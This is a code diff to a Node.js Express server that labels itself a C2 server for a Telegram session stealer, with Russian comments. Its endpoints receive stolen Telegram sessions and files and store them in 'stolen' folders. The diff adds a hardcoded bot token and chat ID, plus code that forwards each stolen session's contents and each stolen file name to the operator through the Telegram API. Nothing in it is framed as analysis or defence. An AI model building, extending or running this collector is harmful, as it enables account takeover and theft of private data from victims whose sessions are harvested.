@@ -7,7 +7,31 @@ app.use(express.json());
 app.use(express.text({ type: '*/*' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Создаём папки для данных
+// ========== НАСТРОЙКИ TELEGRAM ==========
+// ЗАМЕНИ НА СВОИ ДАННЫЕ!
+const TELEGRAM_BOT_TOKEN = "8323044984:AAESjLYrWHV9Uzvp1o7pZNCxqqLHCiJI6eY";  // Токен бота (например, @stilakk_bot)
+const TELEGRAM_CHAT_ID = "7661793351";          // Твой Telegram ID (узнай у @userinfobot)
+
+// Функция отправки в Telegram
+async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('Ошибка отправки в Telegram:', error);
+    }
+}
+
+// Создаём папки
 if (!fs.existsSync('stolen')) fs.mkdirSync('stolen');
 if (!fs.existsSync('stolen/sessions')) fs.mkdirSync('stolen/sessions');
 if (!fs.existsSync('stolen/files')) fs.mkdirSync('stolen/files');
@@ -29,7 +53,7 @@ app.get('/', (req, res) => {
             <h1>🚀 C2 Server Active</h1>
             <div class="stats">
                 <p>📡 Status: ONLINE</p>
-                <p>🎯 Target: Telegram Session Stealer</p>
+                <p>🤖 Telegram Bot: Active</p>
             </div>
             <a href="/list">📋 View stolen data</a>
         </body>
@@ -44,6 +68,14 @@ app.post('/steal', (req, res) => {
     const filename = `stolen/sessions/telegram_${timestamp}.json`;
     fs.writeFileSync(filename, JSON.stringify(data, null, 2));
     console.log(`✅ [${new Date().toISOString()}] Украдена сессия: ${filename}`);
+    
+    // Отправляем в Telegram
+    const message = `🔐 *НОВАЯ УКРАДЕННАЯ СЕССИЯ!*\n\n` +
+                    `📱 *Данные:*\n` +
+                    `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1500)}\n\`\`\``;
+    
+    sendToTelegram(message);
+    
     res.json({ status: 'ok', file: filename });
 });
 
@@ -53,6 +85,9 @@ app.post('/steal/*', (req, res) => {
     const filepath = `stolen/files/${filename}`;
     fs.writeFileSync(filepath, req.body);
     console.log(`✅ [${new Date().toISOString()}] Украден файл: ${filepath}`);
+    
+    sendToTelegram(`📁 *УКРАДЕН ФАЙЛ:*\n\`${filename}\``);
+    
     res.json({ status: 'ok', file: filepath });
 });
 
@@ -100,19 +135,9 @@ app.get('/download/*', (req, res) => {
     }
 });
 
-// API для последней сессии
-app.get('/latest', (req, res) => {
-    const sessions = fs.readdirSync('stolen/sessions').sort().reverse();
-    if (sessions.length > 0) {
-        const data = JSON.parse(fs.readFileSync(`stolen/sessions/${sessions[0]}`, 'utf8'));
-        res.json(data);
-    } else {
-        res.json({ error: 'No data' });
-    }
-});
-
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
     console.log(`🚀 C2 сервер запущен на порту ${PORT}`);
     console.log(`📡 URL: http://localhost:${PORT}`);
+    console.log(`🤖 Telegram уведомления: Включены`);
 });
